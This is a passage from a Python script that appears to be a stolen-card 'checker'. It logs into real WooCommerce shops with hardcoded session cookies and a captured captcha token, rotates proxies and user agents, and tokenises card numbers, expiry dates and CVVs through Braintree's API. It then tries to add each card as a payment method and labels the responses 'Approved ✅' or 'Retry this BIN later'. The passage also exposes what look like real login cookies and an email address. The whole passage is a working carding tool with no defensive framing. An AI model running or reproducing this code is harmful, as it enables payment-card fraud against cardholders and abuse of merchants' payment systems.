        'g-recaptcha-response': '03AFcWeA5-nVHGTqvwSPfbxiw64-1siaW4mblCwVwtd-tOxRXT4URgPy_IUXRAHPMWWr0TcZlS_1eGOUBLXSWL94Nxs94OLjYqLnG9hZbpk1wRqMcRyrSDZnSTzHzAGHKa1wzrF4npXerFjyAiIWlpI7bk9-_b6sG1LwPeqKbWr9wMZgRlDFh893x1PjX-5YkyR8XL0202v5hi7z_JM7gXcG-PXkkqPVOsDqgLi_ZNepbyFvwNTBrJfgf27ZjwMd4XOEuP0pwPAcL8zrb7xFZe2vc5uWiYVk_VXxKkZ7OdfhHMnbkNtogNVL8OSVWqL4Df1I2uBZm3GC-fH7orazd-gGP9UBZXXt_THkUV5zWRb4o8Fjd19jMlO22L7ziXb-aXlbQeA5yG3_4-6MnfOtL1gXVnx2s98ciDPpQXKuVEXtK7KaX1k7he-h4_fDSsKbo26cFFD11thfNnaJ_regC9G7eNpb2nvNj_me41fWGNo3RXVqCU8ssepHOXHddwLB0B7EteCnidyWoRQP9BwcjmgZLkBcnSOiqthrPuU4-ddBtVtU0MkkIzgnj7ISmhspfhA0-ZNBAv4qGJcKP0wcDqMPfZFHm0pdZzue7YYvlDO4ujuHtmBihX8i_bX5oIcGs3agVenUozjjigUQx_buJheWrhP8_ea2UpCp_7RiLRBGDpbYC1PlkGqY9aCQ6ebAH5V_N8xi0ORzW-CWx6Tk5a52fkZsY9zzu_yXq6kuCbLUPJ2I853iSinxx-27KmKG02zQtW045cfUE7_w7EgKPSkgUH6KjgkVFRSrC-qWHI2YGUixWxlQFPB3N7xD1OA5aaDFaivqgHl8TXEgFJsh65QRbjPxbZI5b2kz-tXqDO407xxjAgEPxjEILty4pRB8uodbLXgdPp-gH1FvmcVDKBNBW-lbLhpqvQzmuz9hPCwa-VvseMzGHy5lS42aTIuI1xQCF3bts6Lshl2qehZ4RLvy2ryuGAOeDe-5lJPnWcf9PWsWTxtcAF88GwnpW6zkBUmzwU-llSW6neFwxNB9NRmHrLfoEhX3R4u42q6Bsf7v2AYtANhnEEbxzBdibEvagii8yKe4MAROVxXWKDE9WdICNjogg7xQ3gb4pxBctZ9x9UyiV9E2KFT5b2vxAutM1gybKR4z6-jpxMloa-tiJyc4AfT3igw9FN210LcVrZ2lJrjRvDTlcWjgqDFCqi7vKN4Rn6-RLfvd42U5-kJDJoKFiwejIwt1JiHgf7JSKg8vPdVry78QYloeAXBT_mSFEJZPXZwBC5iOy1SYPkL7-K_ulBnimd3GPHVjY_YJKuUlI8sTTgY7bZM4cO5rpct0mJBpUC5xwFfSusmaAkXw760O-jbqj0hubbTRghb7_ye73Y-bUUAbU-YAbS2R_P90WFeen9CfdR6j5zDMq2bxdtp6G0WQ3p596AyxqtL5ifXFuX_oyOrgylBBvvjP5eBAI2mWoEMg9C5n9_UUIeSRE0KpIInIiRONN0K_V4PkEDRZQGjy3YCPW--C6Tn2VXZHuXBBsJ62s8Cs_OTq9P5ets7RaY21XCMVh5lDHKGx8Zxn0eC8KwuFIRx37euFrmlP-G_5UcxDsLPMDnXCH5GRtP06nYbTLWWWa3TPv84Jjqyzs4M13rzK49NWHlvVaVxJq03T8HWznoNALqDBXQYiofZuYg5TlzqLZLDqqfayefNqc1RUnnhIUH6JXg5kMsr96JjSoJHktHr9NFgNtPfGPRPE4BkTIgzvYeJnnFGLnj6__Gmnj4IKWgPpom6mcM3cbjGW0KUbgkDknKivwR01tQkONjHe4GO4wdupQWsWzgCSiADgyxVohL5VqNb-VmMWv9h15BEUyPkEQcgiJUt3sURQvpbI5J2Gz6jCt4UvX6PkQUxT_oNhklNetUBSzCSELWTHLrUAGDkZeRDqrrwNR4cTasnVCF2wr-u8EJMtG6ybyR-16x4TAdP8sn8m_JB92qTCK-0XDmwkmm_HVZdtd8LFIVrNKjkHYQQh6ciPhxv9o2EFYMVsDoezS1QKXH5z6Dl3Ytl6ZZdPLNnatTN8hjhJVs4HFgT0GHFw1YRduNr2foLLnt8YhXYkEppqM_EHShWztgBl0OVOASEGsYqr6F9tnaSQ899jH9v8rafjhv_KWkQL8gcIV9f6iV0_SA0mdKFyHpb-3pz-WYkiZcykR4oc5KEP07tkm1sDM5Ee1XMY4TnP_bjO5X5n5-tcY4sV1uN3DxiTlEyvdEhPvrrPiKQN--g4I8apNOjSjSv9DT5GafQvkvmGatlNI',
        'rememberme': 'forever',
        'woocommerce-login-nonce': login,
        '_wp_http_referer': '/account/',
        'login': 'Log in',
    }
    
    try:
        response = r.post('https://altairtech.io/account/', cookies=r.cookies, headers=headers, data=data, proxies=proxies, timeout=15) 
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele2 - login POST: {e}")
        return "ERROR: Proxy/Connection Failed"
        
    cookies = {
        'mailchimp_landing_site': 'https%3A%2F%2Faltairtech.io%2Faccount%2Fadd-payment-method%2F',
        '_gcl_au': '1.1.740633636.1751703187',
        '_gid': 'GA1.2.952736372.1751703188',
        'cookie_notice_accepted': 'false',
        'mailchimp_user_previous_email': 'yskg57650%40gmail.com',
        'mailchimp_user_email': 'yskg57650%40gmail.com',
        'tk_or': '%22%22',
        'tk_r3d': '%22%22',
        'tk_lr': '%22%22',
        'tk_ai': 'XGd3cd2PSdSzOW8OFCpmnM7X',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2025-07-05%2009%3A05%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Faltairtech.io%2Faccount%2F%23ast-woo-login%7C%7C%7Crf%3Dhttps%3A%2F%2Faltairtech.io%2Faccount%2F',
        'sbjs_first_add': 'fd%3D2025-07-05%2009%3A05%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Faltairtech.io%2Faccount%2F%23ast-woo-login%7C%7C%7Crf%3Dhttps%3A%2F%2Faltairtech.io%2Faccount%2F',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
        'mailchimp.cart.current_email': 'yskg57650@gmail.com',
        'wordpress_logged_in_7c33bd78f71e082d62697d13f74a0021': 'yskg57650%7C1752916000%7CYk0mSIwqO96hHMp84am6q748EmzT8fdqkdHIKoKWEo9%7C261c8349db520e35babab79e29773f430f13d54d845522bd26d1e5e18ab1d49a',
        'wfwaf-authcookie-74c49e2112830396e9baec30623bfbea': '9620%7Cother%7Cread%7Cbf36ae495a0b98c52b47d4b2e67f4de5f2d567dd2d1ce036953b6f3d255564fb',
        '_ga_N8YW1QLV2Q': 'GS2.1.s1751703186$o1$g1$t1751706405$j60$l0$h0',
        '_gat_gtag_UA_215939567_1': '1',
        '_ga_29BER9N3V6': 'GS2.1.s1751705642$o2$g1$t1751706589$j33$l0$h0',
        '_ga_PKD901Y5LQ': 'GS2.1.s1751705642$o2$g1$t1751706589$j33$l0$h0',
        'sbjs_session': 'pgs%3D40%7C%7C%7Ccpg%3Dhttps%3A%2F%2Faltairtech.io%2Faccount%2Fpayment-methods%2F',
        'tk_qs': '',
        '_ga': 'GA1.2.869150998.1751703187',
    }
    
    headers = {
        'authority': 'altairtech.io',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'referer': 'https://altairtech.io/account/edit-address/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    try:
        response = r.get('https://altairtech.io/account/edit-address/billing/', cookies=cookies, headers=headers, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele2 - billing GET: {e}")
        return "ERROR: Proxy/Connection Failed"
    
    add = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
    
    headers = {
        'authority': 'altairtech.io',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://altairtech.io',
        'referer': 'https://altairtech.io/account/edit-address/billing/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'thwcfe_disabled_fields': '',
        'thwcfe_disabled_sections': '',
        'thwcfe_unvalidated_fields': '',
        'billing_first_name': 'irordioos',
        'billing_last_name': 'eugoeo',
        'billing_company': 'california ',
        'billing_country': 'US',
        'billing_address_1': '7006 STANFORD AVE',
        'billing_address_2': 'CA 90001-1583',
        'billing_city': 'california ',
        'billing_state': 'CA',
        'billing_postcode': '90001',
        'billing_phone': '2055550123',
        'billing_email': 'yskg57650@gmail.com',
        'save_address': 'Save address',
        'woocommerce-edit-address-nonce': add,
        '_wp_http_referer': '/account/edit-address/billing/',
        'action': 'edit_address',
    }
    
    try:
        response = r.post('https://altairtech.io/account/edit-address/billing/', headers=headers, data=data, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele2 - edit address POST: {e}")
        return "ERROR: Proxy/Connection Failed"
    
    cookies = {
        'mailchimp_landing_site': 'https%3A%2F%2Faltairtech.io%2Faccount%2Fadd-payment-method%2F',
        '_gcl_au': '1.1.740633636.1751703187',
        '_gid': 'GA1.2.952736372.1751703188',
        'cookie_notice_accepted': 'false',
        'mailchimp_user_previous_email': 'yskg57650%40gmail.com',
        'mailchimp_user_email': 'yskg57650%40gmail.com',
        'tk_or': '%22%22',
        'tk_r3d': '%22%22',
        'tk_lr': '%22%22',
        'tk_ai': 'XGd3cd2PSdSzOW8OFCpmnM7X',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2025-07-05%2009%3A05%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Faltairtech.io%2Faccount%2F%23ast-woo-login%7C%7C%7Crf%3Dhttps%3A%2F%2Faltairtech.io%2Faccount%2F',
        'sbjs_first_add': 'fd%3D2025-07-05%2009%3A05%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Faltairtech.io%2Faccount%2F%23ast-woo-login%7C%7C%7Crf%3Dhttps%3A%2F%2Faltairtech.io%2Faccount%2F',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
        'mailchimp.cart.current_email': 'yskg57650@gmail.com',
        'wordpress_logged_in_7c33bd78f71e082d62697d13f74a0021': 'yskg57650%7C1752916000%7CYk0mSIwqO96hHMp84am6q748EmzT8fdqkdHIKoKWEo9%7C261c8349db520e35babab79e29773f430f13d54d845522bd26d1e5e18ab1d49a',
        'wfwaf-authcookie-74c49e2112830396e9baec30623bfbea': '9620%7Cother%7Cread%7Cbf36ae495a0b98c52b47d4b2e67f4de5f2d567dd2d1ce036953b6f3d255564fb',
        '_ga_N8YW1QLV2Q': 'GS2.1.s1751703186$o1$g1$t1751706405$j60$l0$h0',
        '_gat_gtag_UA_215939567_1': '1',
        '_ga_29BER9N3V6': 'GS2.1.s1751705642$o2$g1$t1751706589$j33$l0$h0',
        '_ga_PKD901Y5LQ': 'GS2.1.s1751705642$o2$g1$t1751706589$j33$l0$h0',
        'sbjs_session': 'pgs%3D40%7C%7C%7Ccpg%3Dhttps%3A%2F%2Faltairtech.io%2Faccount%2Fpayment-methods%2F',
        'tk_qs': '',
        '_ga': 'GA1.2.869150998.1751703187',
    }
    
    headers = {
        'authority': 'altairtech.io',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'referer': 'https://altairtech.io/account/payment-methods/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    try:
        response = r.get('https://altairtech.io/account/add-payment-method/', cookies=cookies, headers=headers, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele2 - add payment method GET (1): {e}")
        return "ERROR: Proxy/Connection Failed"
    
    nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
    headers = {
        'authority': 'altairtech.io',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'referer': 'https://altairtech.io/account/payment-methods/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    try:
        response = r.get('https://altairtech.io/account/add-payment-method/', headers=headers, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele2 - add payment method GET (2): {e}")
        return "ERROR: Proxy/Connection Failed"
    
    client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
    
    headers = {
        'authority': 'altairtech.io',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://altairtech.io',
        'referer': 'https://altairtech.io/account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client,
    }
    
    try:
        response = r.post('https://altairtech.io/wp-admin/admin-ajax.php', headers=headers, data=data, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele2 - ajax POST: {e}")
        return "ERROR: Proxy/Connection Failed"
        
    enc = response.json()['data']
    dec = base64.b64decode(enc).decode('utf-8')
    auth=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
    
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'authorization': f'Bearer {auth}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user, 
    }
    
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': str(uuid.uuid4()),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': c,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    try:
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxies, timeout=15)
        tok=(response.json()['data']['tokenizeCreditCard']['token'])
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele2 - Braintree GraphQL POST: {e}")
        return "ERROR: Proxy/Connection Failed"
    except KeyError:
        return "Declined - Tokenization Failed"
    
    cookies = {
        'mailchimp_landing_site': 'https%3A%2F%2Faltairtech.io%2Faccount%2Fadd-payment-method%2F',
        '_gcl_au': '1.1.740633636.1751703187',
        '_gid': 'GA1.2.952736372.1751703188',
        'cookie_notice_accepted': 'false',
        'mailchimp_user_previous_email': 'yskg57650%40gmail.com',
        'mailchimp_user_email': 'yskg57650%40gmail.com',
        'tk_or': '%22%22',
        'tk_r3d': '%22%22',
        'tk_lr': '%22%22',
        'tk_ai': 'XGd3cd2PSdSzOW8OFCpmnM7X',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2025-07-05%2009%3A05%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Faltairtech.io%2Faccount%2F%23ast-woo-login%7C%7C%7Crf%3Dhttps%3A%2F%2Faltairtech.io%2Faccount%2F',
        'sbjs_first_add': 'fd%3D2025-07-05%2009%3A05%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Faltairtech.io%2Faccount%2F%23ast-woo-login%7C%7C%7Crf%3Dhttps%3A%2F%2Faltairtech.io%2Faccount%2F',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
        'mailchimp.cart.current_email': 'yskg57650@gmail.com',
        'wordpress_logged_in_7c33bd78f71e082d62697d13f74a0021': 'yskg57650%7C1752916000%7CYk0mSIwqO96hHMp84am6q748EmzT8fdqkdHIKoKWEo9%7C261c8349db520e35babab79e29773f430f13d54d845522bd26d1e5e18ab1d49a',
        'wfwaf-authcookie-74c49e2112830396e9baec30623bfbea': '9620%7Cother%7Cread%7Cbf36ae495a0b98c52b47d4b2e67f4de5f2d567dd2d1ce036953b6f3d255564fb',
        '_ga_N8YW1QLV2Q': 'GS2.1.s1751703186$o1$g1$t1751706405$j60$l0$h0',
        '_ga_29BER9N3V6': 'GS2.1.s1751705642$o2$g1$t1751706609$j13$l0$h0',
        '_ga_PKD901Y5LQ': 'GS2.1.s1751705642$o2$g1$t1751706609$j13$l0$h0',
        '_ga': 'GA1.2.869150998.1751703187',
        'sbjs_session': 'pgs%3D43%7C%7C%7Ccpg%3Dhttps%3A%2F%2Faltairtech.io%2Faccount%2Fadd-payment-method%2F',
        'tk_qs': '',
    }
    
    headers = {
        'authority': 'altairtech.io',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://altairtech.io',
        'referer': 'https://altairtech.io/account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': 'visa',
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce': tok,
        'wc_braintree_device_data': '{"correlation_id":"5a0b53e337ef525eda372ffeee1d7741"}',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': nonce,
        '_wp_http_referer': '/account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }
    
    try:
        response = r.post('https://altairtech.io/account/add-payment-method/', cookies=cookies, headers=headers, data=data, proxies=proxies, timeout=15)
        text = response.text
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele2 - final POST: {e}")
        return "ERROR: Proxy/Connection Failed"
        
    pattern = r'Status code (.*?)\s*</li>'
    match = re.search(pattern, text)
    if match:
        result = match.group(1)
        if 'risk_threshold' in text:
            result = "RISK: Retry this BIN later."
    else:
        if 'added' in text or 'Payment method successfully added.' in text:
            result = "Approved ✅"
            return result
        else:
            try:
                result = text.split('Status code ')[1].split('<')[0]
            except:
                try:
                    result = match
                except:
                    result = 'Unknow Response'
    if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
            return 'Approved'
    else:
        return result			
    
    if 'risk_threshold' in result:
            return "RISK: Retry this BIN later."
    elif 'You cannot add a new payment method so soon after the previous one' in result:
            return "Please wait for 20 seconds."
    elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in text:
            return 'Approved ✅'
    elif 'Duplicate card exists in the vault.' in result:
            return 'Approved ✅! - Duplicate'
    elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
            return 'Approved ✅! - AVS-CVV'
    elif "Invalid postal code" in result or "CVV." in result:
            return 'Approved ✅! - Invalid postal code and cvv'
    elif "Card Issuer Declined CVV" in result:
            return 'Approved ✅! - Declined CVV'
    elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
            return 'Approved ✅!'
    else:
        return result
		
		
def Tele3(ccx):
    proxies = get_random_proxy_dict()
    ccx = ccx.strip()
    parts = re.split(r'[ |/]', ccx)
    c = parts[0]
    mm = parts[1]
    ex = parts[2]
    cvc = parts[3]
    try:
        yy = ex[2] + ex[3]
        if '2' in ex[3] or '1' in ex[3]:
            yy = ex[2] + '7'
        else:
            pass
    except:
        yy = ex[0] + ex[1]
        if '2' in ex[1] or '1' in ex[1]:
            yy = ex[0] + '7'
        else:
            pass
    print(c,mm,yy,cvc)

    try:
        open("cok.txt", "r")
    except:
        open("cok.txt", "w").close()

    with open("cok.txt", "r") as file:
        first_line = file.readline().strip()

    last_used_times = {}

    cookei = ""
    while True:
        lines = """bmwiraqy9074@gmail.com"""
        lines = lines.strip().split("\n")
        random_line_number = random.randint(0, len(lines) - 1)
        temp_cookei = lines[random_line_number]

        current_time = time.time()

        if temp_cookei in last_used_times:
            time_since_last_use = current_time - last_used_times[temp_cookei]
            if time_since_last_use < 20:
                continue

        if temp_cookei == first_line:
            pass
        else:
            cookei = temp_cookei
            last_used_times[cookei] = current_time
            break

    with open("cok.txt", "w") as file:
        file.write(cookei)
        print(cookei)
        
    user = user_agent.generate_user_agent()
    r  = requests.session()
    characters = string.ascii_uppercase + string.digits
    postal_code = ''.join(random.choices(characters, k=6))
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    email = f"{username}@gmail.com"
    User  = f"{username}ooepr"
    em = f"{username}%40gmail.com"
    
    corr = str(uuid.uuid4())

    headers = {
        'authority': 'www.midwestspeakerrepair.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'referer': 'https://www.midwestspeakerrepair.com/my-account/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    try:
        response = r.get('https://www.midwestspeakerrepair.com/my-account/', headers=headers, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele3 - initial GET: {e}")
        return "ERROR: Proxy/Connection Failed"
        
    login = re.search(r'name="woocommerce-login-nonce" value="(.*?)"',response.text).group(1)
    
    headers = {
        'authority': 'www.midwestspeakerrepair.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.midwestspeakerrepair.com',
        'referer': 'https://www.midwestspeakerrepair.com/my-account/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
